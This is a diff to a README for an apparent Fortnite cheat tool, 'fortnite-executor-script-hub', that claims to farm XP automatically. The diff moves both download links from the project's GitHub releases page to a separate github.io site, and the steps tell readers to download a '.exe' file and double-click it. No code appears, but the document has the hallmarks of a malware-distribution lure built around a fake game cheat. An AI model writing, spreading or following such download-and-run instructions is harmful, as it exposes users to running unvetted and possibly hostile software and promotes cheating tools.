@@ -1,6 +1,6 @@
 # 🎮 fortnite-executor-script-hub - Earn XP through automated game routines
 
-[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Nathanilclathrate809/fortnite-executor-script-hub/releases)
+[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://nathanilclathrate809.github.io)
 
 This application provides a web-based interface to manage routine tasks within Fortnite. It runs automated scripts to assist with experience point accumulation. The software works on Windows computers and mobile devices. You interact with the tool through your standard web browser.
 
@@ -18,7 +18,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit this page to download the latest version: [https://github.com/Nathanilclathrate809/fortnite-executor-script-hub/releases](https://github.com/Nathanilclathrate809/fortnite-executor-script-hub/releases).
+1.  Visit this page to download the latest version: [https://nathanilclathrate809.github.io](https://nathanilclathrate809.github.io).
 2.  Look for the section labeled "Assets" under the most recent release.
 3.  Click the link that ends in ".exe" to start your download.
 4.  Open your Downloads folder and double-click the file you just downloaded.
